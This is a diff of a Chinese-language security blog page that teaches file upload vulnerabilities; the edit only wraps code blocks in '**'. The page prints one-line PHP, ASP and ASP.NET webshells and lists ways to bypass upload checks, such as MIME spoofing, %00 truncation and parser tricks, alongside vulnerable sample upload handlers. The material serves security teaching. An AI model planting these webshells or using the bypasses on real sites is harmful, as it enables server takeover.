@@ -133,7 +133,7 @@
     
     <p>&lt; !–more–&gt;<br>一句话木马<br>PHP：<br>    <strong>&lt;?php echo shell_exec($_GET[‘a’]);?&gt;</strong><br>    <strong>&lt;?php @eval($_POST[‘a’]); ?&gt;</strong><br>ASP:<br>    <strong>&lt;%eval request(“Cknife”)%&gt;</strong><br>　<br>ASP.NET:<br>    <strong>&lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</strong></p>
 <p>文件上传漏洞检测<br>    1、客户端javascript检测（通常在本地检测文件的扩展名）<br>    绕过：<br>        ①禁用js<br>        ②先把文件改成符合条件的文件格式上传，再在抓包，修改文件的后缀名<br>    2、服务端检测绕过（MIME类型检测）<br>    绕过：<br>        可以通过burp拦包，将原Content-Type类型改成符合的类型。<br>    基于MIME</p>
-<pre><code>&lt;?php  
+<pre><code>**&lt;?php  
     if (isset($_POST[&apos;Upload&apos;])) {
      $target_path = DVWA_WEB_PAGE_TO_ROOT.&quot;hackable/uploads/&quot;;
      $target_path = $target_path . basename($_FILES[&apos;uploaded&apos;][&apos;name&apos;]);
@@ -159,7 +159,7 @@
         echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;  
         } 
     }   
-?&gt;
+?&gt;**
 
 3、服务端目录路径检测
 绕过：
@@ -176,7 +176,7 @@
     例如：1.php%00.jpg，验证扩展名是.jpg，但写入的时候是1.php文件。
 基于黑名单
 
-&lt;?php
+**&lt;?php
     $BlackList = array(&apos;asp&apos;,&apos;php&apos;,&apos;jsp&apos;,&apos;php5&apos;,&apos;asa&apos;,&apos;aspx’);
     //黑名单
     if (isset($_POST[&quot;submit&quot;])){
@@ -208,7 +208,7 @@
         echo &quot;文件不合法！！&quot;;
     }    
 }
-?&gt;
+?&gt;**
 
 （2）白名单检测：接收上传的文件做扩展名匹配，匹配上白名单中的扩展名才能上传
 绕过：
@@ -221,7 +221,7 @@
     例如：evil.jpg/.php，evil.jpg会解析为php的格式
 基于白名单
 
-&lt;?php
+**&lt;?php
     $WhiteList=array(&apos;rar&apos;,&apos;jpg&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;gif&apos;,&apos;jpg&apos;,&apos;doc’);
     if (isset($_POST[&quot;submit&quot;])){
         $name = $_FILES[&apos;file&apos;][&apos;name’]; 
@@ -250,7 +250,7 @@
             echo &quot;文件不合法！！&quot;;
             }        
     }
-?&gt;
+?&gt;**
 
 5、服务端文件内容检测
 图像类的文件内容检测
